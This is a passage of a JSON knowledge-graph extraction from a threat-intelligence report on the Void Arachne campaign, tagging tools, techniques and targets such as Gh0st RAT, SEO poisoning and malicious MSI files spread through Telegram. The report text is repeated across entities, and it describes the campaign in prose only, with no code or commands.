      "type": "Tool",
      "id": "tool--vpn-software",
      "description": "被利用的VPN软件",
      "labels": "Tool",
      "chunks_info": [
        {
          "chunk_id": 4,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Initial access\n\n### **Targeting VPN-related technologies for spearphishing**  \nInternet connectivity in the People’s Republic of China is subject to strict regulation through a combination of legislative measures and technological controls collectively known as the [Great Firewall of China](https://www.britannica.com/topic/Great-Firewall). Due to strict government control, VPN services and public interest in this technology have notably increased. This has, in turn, enhanced threat actors' interest in exploiting the heightened public interest in software that can evade the Great Firewall and online censorship.  \nWe discovered that the VPN “快連VPN” is a common phishing and SEO poisoning vector used to target Chinese-speakers and the broader East Asian community. We have evidence of multiple distinct Chinese-speaking threat actors creating spear-phishing links and using SEO poisoning tactics by bundling this VPN with malware that includes Gh0st RAT and its variants.",
          "chunk_length": 1033,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Initial access",
            "Header 3": "### **Targeting VPN-related technologies for spearphishing**",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Initial access",
              "### **Targeting VPN-related technologies for spearphishing**"
            ],
            "content_type": "text",
            "token_length": 190,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 4,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "Gh0st RAT",
      "type": "Tool",
      "id": "tool--gh0st-rat",
      "description": "Gh0st远程访问木马",
      "labels": "Tool",
      "chunks_info": [
        {
          "chunk_id": 4,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Initial access\n\n### **Targeting VPN-related technologies for spearphishing**  \nInternet connectivity in the People’s Republic of China is subject to strict regulation through a combination of legislative measures and technological controls collectively known as the [Great Firewall of China](https://www.britannica.com/topic/Great-Firewall). Due to strict government control, VPN services and public interest in this technology have notably increased. This has, in turn, enhanced threat actors' interest in exploiting the heightened public interest in software that can evade the Great Firewall and online censorship.  \nWe discovered that the VPN “快連VPN” is a common phishing and SEO poisoning vector used to target Chinese-speakers and the broader East Asian community. We have evidence of multiple distinct Chinese-speaking threat actors creating spear-phishing links and using SEO poisoning tactics by bundling this VPN with malware that includes Gh0st RAT and its variants.",
          "chunk_length": 1033,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Initial access",
            "Header 3": "### **Targeting VPN-related technologies for spearphishing**",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Initial access",
              "### **Targeting VPN-related technologies for spearphishing**"
            ],
            "content_type": "text",
            "token_length": 190,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 4,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "Spearphishing Link",
      "type": "Technique",
      "id": "technique--spearphishing",
      "description": "鱼叉式网络钓鱼链接技术",
      "labels": "Technique",
      "chunks_info": [
        {
          "chunk_id": 4,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Initial access\n\n### **Targeting VPN-related technologies for spearphishing**  \nInternet connectivity in the People’s Republic of China is subject to strict regulation through a combination of legislative measures and technological controls collectively known as the [Great Firewall of China](https://www.britannica.com/topic/Great-Firewall). Due to strict government control, VPN services and public interest in this technology have notably increased. This has, in turn, enhanced threat actors' interest in exploiting the heightened public interest in software that can evade the Great Firewall and online censorship.  \nWe discovered that the VPN “快連VPN” is a common phishing and SEO poisoning vector used to target Chinese-speakers and the broader East Asian community. We have evidence of multiple distinct Chinese-speaking threat actors creating spear-phishing links and using SEO poisoning tactics by bundling this VPN with malware that includes Gh0st RAT and its variants.",
          "chunk_length": 1033,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Initial access",
            "Header 3": "### **Targeting VPN-related technologies for spearphishing**",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Initial access",
              "### **Targeting VPN-related technologies for spearphishing**"
            ],
            "content_type": "text",
            "token_length": 190,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 4,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "Behind the Great Wall Void Arachne Targets Chinese",
      "type": "Report",
      "id": "report--great-wall",
      "description": "威胁情报报告",
      "labels": "Report",
      "chunks_info": [
        {
          "chunk_id": 4,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Initial access\n\n### **Targeting VPN-related technologies for spearphishing**  \nInternet connectivity in the People’s Republic of China is subject to strict regulation through a combination of legislative measures and technological controls collectively known as the [Great Firewall of China](https://www.britannica.com/topic/Great-Firewall). Due to strict government control, VPN services and public interest in this technology have notably increased. This has, in turn, enhanced threat actors' interest in exploiting the heightened public interest in software that can evade the Great Firewall and online censorship.  \nWe discovered that the VPN “快連VPN” is a common phishing and SEO poisoning vector used to target Chinese-speakers and the broader East Asian community. We have evidence of multiple distinct Chinese-speaking threat actors creating spear-phishing links and using SEO poisoning tactics by bundling this VPN with malware that includes Gh0st RAT and its variants.",
          "chunk_length": 1033,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Initial access",
            "Header 3": "### **Targeting VPN-related technologies for spearphishing**",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Initial access",
              "### **Targeting VPN-related technologies for spearphishing**"
            ],
            "content_type": "text",
            "token_length": 190,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 4,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "SEO Poisoning",
      "type": "Technique",
      "id": "technique--seo-poisoning",
      "description": "搜索引擎优化投毒技术",
      "labels": "Technique",
      "chunks_info": [
        {
          "chunk_id": 4,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Initial access\n\n### **Targeting VPN-related technologies for spearphishing**  \nInternet connectivity in the People’s Republic of China is subject to strict regulation through a combination of legislative measures and technological controls collectively known as the [Great Firewall of China](https://www.britannica.com/topic/Great-Firewall). Due to strict government control, VPN services and public interest in this technology have notably increased. This has, in turn, enhanced threat actors' interest in exploiting the heightened public interest in software that can evade the Great Firewall and online censorship.  \nWe discovered that the VPN “快連VPN” is a common phishing and SEO poisoning vector used to target Chinese-speakers and the broader East Asian community. We have evidence of multiple distinct Chinese-speaking threat actors creating spear-phishing links and using SEO poisoning tactics by bundling this VPN with malware that includes Gh0st RAT and its variants.",
          "chunk_length": 1033,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Initial access",
            "Header 3": "### **Targeting VPN-related technologies for spearphishing**",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Initial access",
              "### **Targeting VPN-related technologies for spearphishing**"
            ],
            "content_type": "text",
            "token_length": 190,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 4,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "VPN-related Spearphishing Campaign",
      "type": "AttackEvent",
      "id": "attack-event--vpn-campaign",
      "description": "与VPN相关的鱼叉式网络钓鱼活动",
      "labels": "AttackEvent",
      "chunks_info": [
        {
          "chunk_id": 4,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Initial access\n\n### **Targeting VPN-related technologies for spearphishing**  \nInternet connectivity in the People’s Republic of China is subject to strict regulation through a combination of legislative measures and technological controls collectively known as the [Great Firewall of China](https://www.britannica.com/topic/Great-Firewall). Due to strict government control, VPN services and public interest in this technology have notably increased. This has, in turn, enhanced threat actors' interest in exploiting the heightened public interest in software that can evade the Great Firewall and online censorship.  \nWe discovered that the VPN “快連VPN” is a common phishing and SEO poisoning vector used to target Chinese-speakers and the broader East Asian community. We have evidence of multiple distinct Chinese-speaking threat actors creating spear-phishing links and using SEO poisoning tactics by bundling this VPN with malware that includes Gh0st RAT and its variants.",
          "chunk_length": 1033,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Initial access",
            "Header 3": "### **Targeting VPN-related technologies for spearphishing**",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Initial access",
              "### **Targeting VPN-related technologies for spearphishing**"
            ],
            "content_type": "text",
            "token_length": 190,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 4,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "East Asian Community",
      "type": "Target",
      "id": "target--east-asian-community",
      "description": "东亚社区",
      "labels": "Target",
      "chunks_info": [
        {
          "chunk_id": 4,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Initial access\n\n### **Targeting VPN-related technologies for spearphishing**  \nInternet connectivity in the People’s Republic of China is subject to strict regulation through a combination of legislative measures and technological controls collectively known as the [Great Firewall of China](https://www.britannica.com/topic/Great-Firewall). Due to strict government control, VPN services and public interest in this technology have notably increased. This has, in turn, enhanced threat actors' interest in exploiting the heightened public interest in software that can evade the Great Firewall and online censorship.  \nWe discovered that the VPN “快連VPN” is a common phishing and SEO poisoning vector used to target Chinese-speakers and the broader East Asian community. We have evidence of multiple distinct Chinese-speaking threat actors creating spear-phishing links and using SEO poisoning tactics by bundling this VPN with malware that includes Gh0st RAT and its variants.",
          "chunk_length": 1033,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Initial access",
            "Header 3": "### **Targeting VPN-related technologies for spearphishing**",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Initial access",
              "### **Targeting VPN-related technologies for spearphishing**"
            ],
            "content_type": "text",
            "token_length": 190,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 4,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "Telegram Spearphishing Campaign",
      "type": "AttackEvent",
      "id": "attack-event--telegram-spearphishing",
      "description": "通过Telegram进行的鱼叉式网络钓鱼攻击活动",
      "labels": "AttackEvent",
      "chunks_info": [
        {
          "chunk_id": 5,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Initial access\n\n### **Spearphishing through Telegram**  \nWe observed several Telegram channels, some of which had tens of thousands of Chinese-speaking users, advertising malicious archives and MSI files as an additional distribution method. The malicious packages are in what appear to be Simplified Chinese language packs for Telegram as well as various AI tools.",
          "chunk_length": 421,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Initial access",
            "Header 3": "### **Spearphishing through Telegram**",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Initial access",
              "### **Spearphishing through Telegram**"
            ],
            "content_type": "text",
            "token_length": 67,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 5,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "Telegram Distribution Procedure",
      "type": "Procedure",
      "id": "procedure--telegram-distribution",
      "description": "通过Telegram分发恶意软件的程序",
      "labels": "Procedure",
      "chunks_info": [
        {
          "chunk_id": 5,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Initial access\n\n### **Spearphishing through Telegram**  \nWe observed several Telegram channels, some of which had tens of thousands of Chinese-speaking users, advertising malicious archives and MSI files as an additional distribution method. The malicious packages are in what appear to be Simplified Chinese language packs for Telegram as well as various AI tools.",
          "chunk_length": 421,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Initial access",
            "Header 3": "### **Spearphishing through Telegram**",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Initial access",
              "### **Spearphishing through Telegram**"
            ],
            "content_type": "text",
            "token_length": 67,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 5,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "Spearphishing Link",
      "type": "Technique",
      "id": "technique--spearphishing",
      "description": "鱼叉式网络钓鱼链接技术",
      "labels": "Technique",
      "chunks_info": [
        {
          "chunk_id": 5,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Initial access\n\n### **Spearphishing through Telegram**  \nWe observed several Telegram channels, some of which had tens of thousands of Chinese-speaking users, advertising malicious archives and MSI files as an additional distribution method. The malicious packages are in what appear to be Simplified Chinese language packs for Telegram as well as various AI tools.",
          "chunk_length": 421,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Initial access",
            "Header 3": "### **Spearphishing through Telegram**",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Initial access",
              "### **Spearphishing through Telegram**"
            ],
            "content_type": "text",
            "token_length": 67,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 5,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "Behind the Great Wall Void Arachne Targets Chinese",
      "type": "Report",
      "id": "report--great-wall",
      "description": "威胁情报报告",
      "labels": "Report",
      "chunks_info": [
        {
          "chunk_id": 5,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Initial access\n\n### **Spearphishing through Telegram**  \nWe observed several Telegram channels, some of which had tens of thousands of Chinese-speaking users, advertising malicious archives and MSI files as an additional distribution method. The malicious packages are in what appear to be Simplified Chinese language packs for Telegram as well as various AI tools.",
          "chunk_length": 421,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Initial access",
            "Header 3": "### **Spearphishing through Telegram**",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Initial access",
              "### **Spearphishing through Telegram**"
            ],
            "content_type": "text",
            "token_length": 67,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 5,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "MSI Files",
      "type": "Tool",
      "id": "tool--msi-files",
      "description": "恶意MSI安装文件",
      "labels": "Tool",
      "chunks_info": [
        {
          "chunk_id": 5,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Initial access\n\n### **Spearphishing through Telegram**  \nWe observed several Telegram channels, some of which had tens of thousands of Chinese-speaking users, advertising malicious archives and MSI files as an additional distribution method. The malicious packages are in what appear to be Simplified Chinese language packs for Telegram as well as various AI tools.",
          "chunk_length": 421,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Initial access",
            "Header 3": "### **Spearphishing through Telegram**",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Initial access",
              "### **Spearphishing through Telegram**"
            ],
            "content_type": "text",
            "token_length": 67,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 5,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "Chinese-Speaking Users",
      "type": "Target",
      "id": "target--chinese-users",
      "description": "中文用户",
      "labels": "Target",
      "chunks_info": [
        {
          "chunk_id": 5,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Initial access\n\n### **Spearphishing through Telegram**  \nWe observed several Telegram channels, some of which had tens of thousands of Chinese-speaking users, advertising malicious archives and MSI files as an additional distribution method. The malicious packages are in what appear to be Simplified Chinese language packs for Telegram as well as various AI tools.",
          "chunk_length": 421,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Initial access",
            "Header 3": "### **Spearphishing through Telegram**",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Initial access",
              "### **Spearphishing through Telegram**"
            ],
            "content_type": "text",
            "token_length": 67,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 5,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "Malicious Archives",
      "type": "Tool",
      "id": "tool--malicious-archives",
      "description": "恶意存档文件",
      "labels": "Tool",
      "chunks_info": [
        {
          "chunk_id": 5,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Initial access\n\n### **Spearphishing through Telegram**  \nWe observed several Telegram channels, some of which had tens of thousands of Chinese-speaking users, advertising malicious archives and MSI files as an additional distribution method. The malicious packages are in what appear to be Simplified Chinese language packs for Telegram as well as various AI tools.",
          "chunk_length": 421,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Initial access",
            "Header 3": "### **Spearphishing through Telegram**",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Initial access",
              "### **Spearphishing through Telegram**"
            ],
            "content_type": "text",
            "token_length": 67,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 5,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "Void Arachne",
      "type": "ThreatOrganization",
      "id": "threat-org--void-arachne",
      "description": "威胁组织",
      "labels": "ThreatOrganization",
      "chunks_info": [
        {
          "chunk_id": 5,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Initial access\n\n### **Spearphishing through Telegram**  \nWe observed several Telegram channels, some of which had tens of thousands of Chinese-speaking users, advertising malicious archives and MSI files as an additional distribution method. The malicious packages are in what appear to be Simplified Chinese language packs for Telegram as well as various AI tools.",
          "chunk_length": 421,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Initial access",
            "Header 3": "### **Spearphishing through Telegram**",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Initial access",
              "### **Spearphishing through Telegram**"
            ],
            "content_type": "text",
            "token_length": 67,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 5,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "Telegram Spearphishing Campaign",
      "type": "AttackEvent",
      "id": "attack-event--telegram-spearphishing",
      "description": "通过Telegram进行的鱼叉式网络钓鱼活动",
      "labels": "AttackEvent",
      "chunks_info": [
        {
          "chunk_id": 6,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Initial access\n### **Spearphishing through Telegram**\n\n#### VPN-related Telegram channels  \nLike what’s being promoted in Void Arachne’s SEO poisoning campaign, we also observed the same malicious MSI files being shared in Chinese language-centric Telegram Channels. These channels are all related to VPN technology and the malicious MSI files were shared across several Telegram channels.  \nThis is like other campaigns we’ve observed wherein after threat actors conduct SEO-poisoning tactics, they then share links to these malicious sites or upload related files on social media and messaging applications.",
          "chunk_length": 665,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Initial access",
            "Header 3": "### **Spearphishing through Telegram**",
            "Header 4": "#### VPN-related Telegram channels",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Initial access",
              "### **Spearphishing through Telegram**",
              "#### VPN-related Telegram channels"
            ],
            "content_type": "text",
            "token_length": 103,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "chunk_id": 6,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "Spearphishing",
      "type": "Technique",
      "id": "technique--spearphishing",
      "description": "鱼叉式网络钓鱼技术",
      "labels": "Technique",
      "chunks_info": [
        {
          "chunk_id": 6,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Initial access\n### **Spearphishing through Telegram**\n\n#### VPN-related Telegram channels  \nLike what’s being promoted in Void Arachne’s SEO poisoning campaign, we also observed the same malicious MSI files being shared in Chinese language-centric Telegram Channels. These channels are all related to VPN technology and the malicious MSI files were shared across several Telegram channels.  \nThis is like other campaigns we’ve observed wherein after threat actors conduct SEO-poisoning tactics, they then share links to these malicious sites or upload related files on social media and messaging applications.",
          "chunk_length": 665,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Initial access",
            "Header 3": "### **Spearphishing through Telegram**",
            "Header 4": "#### VPN-related Telegram channels",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Initial access",
              "### **Spearphishing through Telegram**",
              "#### VPN-related Telegram channels"
            ],
            "content_type": "text",
            "token_length": 103,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "chunk_id": 6,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "Initial Access",
      "type": "Tactic",
      "id": "tactic--initial-access",
      "description": "初始访问战术",
      "labels": "Tactic",
      "chunks_info": [
        {
          "chunk_id": 6,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Initial access\n### **Spearphishing through Telegram**\n\n#### VPN-related Telegram channels  \nLike what’s being promoted in Void Arachne’s SEO poisoning campaign, we also observed the same malicious MSI files being shared in Chinese language-centric Telegram Channels. These channels are all related to VPN technology and the malicious MSI files were shared across several Telegram channels.  \nThis is like other campaigns we’ve observed wherein after threat actors conduct SEO-poisoning tactics, they then share links to these malicious sites or upload related files on social media and messaging applications.",
          "chunk_length": 665,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Initial access",
            "Header 3": "### **Spearphishing through Telegram**",
            "Header 4": "#### VPN-related Telegram channels",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Initial access",
              "### **Spearphishing through Telegram**",
              "#### VPN-related Telegram channels"
            ],
            "content_type": "text",
            "token_length": 103,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "chunk_id": 6,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "Behind the Great Wall Void Arachne Targets Chinese",
      "type": "Report",
      "id": "report--great-wall",
      "description": "威胁情报报告",
      "labels": "Report",
      "chunks_info": [
        {
          "chunk_id": 6,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Initial access\n### **Spearphishing through Telegram**\n\n#### VPN-related Telegram channels  \nLike what’s being promoted in Void Arachne’s SEO poisoning campaign, we also observed the same malicious MSI files being shared in Chinese language-centric Telegram Channels. These channels are all related to VPN technology and the malicious MSI files were shared across several Telegram channels.  \nThis is like other campaigns we’ve observed wherein after threat actors conduct SEO-poisoning tactics, they then share links to these malicious sites or upload related files on social media and messaging applications.",
          "chunk_length": 665,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Initial access",
            "Header 3": "### **Spearphishing through Telegram**",
            "Header 4": "#### VPN-related Telegram channels",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Initial access",
              "### **Spearphishing through Telegram**",
              "#### VPN-related Telegram channels"
            ],
            "content_type": "text",
            "token_length": 103,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "chunk_id": 6,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "Chinese-Speaking Users",
      "type": "Target",
      "id": "target--chinese-users",
      "description": "中文用户",
      "labels": "Target",
      "chunks_info": [
        {
          "chunk_id": 6,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Initial access\n### **Spearphishing through Telegram**\n\n#### VPN-related Telegram channels  \nLike what’s being promoted in Void Arachne’s SEO poisoning campaign, we also observed the same malicious MSI files being shared in Chinese language-centric Telegram Channels. These channels are all related to VPN technology and the malicious MSI files were shared across several Telegram channels.  \nThis is like other campaigns we’ve observed wherein after threat actors conduct SEO-poisoning tactics, they then share links to these malicious sites or upload related files on social media and messaging applications.",
          "chunk_length": 665,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Initial access",
            "Header 3": "### **Spearphishing through Telegram**",
            "Header 4": "#### VPN-related Telegram channels",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Initial access",
              "### **Spearphishing through Telegram**",
              "#### VPN-related Telegram channels"
            ],
            "content_type": "text",
            "token_length": 103,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "chunk_id": 6,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "Malicious MSI File",
      "type": "Tool",
      "id": "tool--msi-file",
      "description": "恶意MSI文件",
      "labels": "Tool",
      "chunks_info": [
        {
          "chunk_id": 6,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Initial access\n### **Spearphishing through Telegram**\n\n#### VPN-related Telegram channels  \nLike what’s being promoted in Void Arachne’s SEO poisoning campaign, we also observed the same malicious MSI files being shared in Chinese language-centric Telegram Channels. These channels are all related to VPN technology and the malicious MSI files were shared across several Telegram channels.  \nThis is like other campaigns we’ve observed wherein after threat actors conduct SEO-poisoning tactics, they then share links to these malicious sites or upload related files on social media and messaging applications.",
          "chunk_length": 665,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Initial access",
            "Header 3": "### **Spearphishing through Telegram**",
            "Header 4": "#### VPN-related Telegram channels",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Initial access",
              "### **Spearphishing through Telegram**",
              "#### VPN-related Telegram channels"
            ],
            "content_type": "text",
            "token_length": 103,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "chunk_id": 6,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "Void Arachne",
      "type": "ThreatOrganization",
      "id": "threat-org--void-arachne",
      "description": "威胁组织",
      "labels": "ThreatOrganization",
      "chunks_info": [
        {
          "chunk_id": 6,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Initial access\n### **Spearphishing through Telegram**\n\n#### VPN-related Telegram channels  \nLike what’s being promoted in Void Arachne’s SEO poisoning campaign, we also observed the same malicious MSI files being shared in Chinese language-centric Telegram Channels. These channels are all related to VPN technology and the malicious MSI files were shared across several Telegram channels.  \nThis is like other campaigns we’ve observed wherein after threat actors conduct SEO-poisoning tactics, they then share links to these malicious sites or upload related files on social media and messaging applications.",
          "chunk_length": 665,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Initial access",
            "Header 3": "### **Spearphishing through Telegram**",
            "Header 4": "#### VPN-related Telegram channels",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Initial access",
              "### **Spearphishing through Telegram**",
              "#### VPN-related Telegram channels"
            ],
            "content_type": "text",
            "token_length": 103,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "chunk_id": 6,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "Behind the Great Wall Void Arachne Targets Chinese",
      "type": "Report",
      "id": "report--great-wall",
      "description": "威胁情报报告",
      "labels": "Report",
      "chunks_info": [
        {
          "chunk_id": 7,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Initial access\n### **Spearphishing through Telegram**\n\n#### Malicious Simplified Chinese language packs for Telegram  \nA common malicious software package we observed is what appears to be a Telegram language pack for the Simplified Chinese language. (Telegram does offer a translation of its app in Simple Chinese, which may be found [here](https://translations.telegram.org/zh-hans/).)  \nUsing infected language packs as an infection vector is an interesting method, especially for the Chinese language, which has an estimated 1.3 billion native speakers. Some applications require language packs for a more localized user experience in regional markets, leaving these users potentially vulnerable to this kind of attack.",
          "chunk_length": 779,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Initial access",
            "Header 3": "### **Spearphishing through Telegram**",
            "Header 4": "#### Malicious Simplified Chinese language packs for Telegram",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Initial access",
              "### **Spearphishing through Telegram**",
              "#### Malicious Simplified Chinese language packs for Telegram"
            ],
            "content_type": "text",
            "token_length": 128,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "chunk_id": 7,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "Spearphishing through Telegram",
      "type": "Technique",
      "id": "technique--spearphishing",
      "description": "通过Telegram进行鱼叉式网络钓鱼的技术",
      "labels": "Technique",
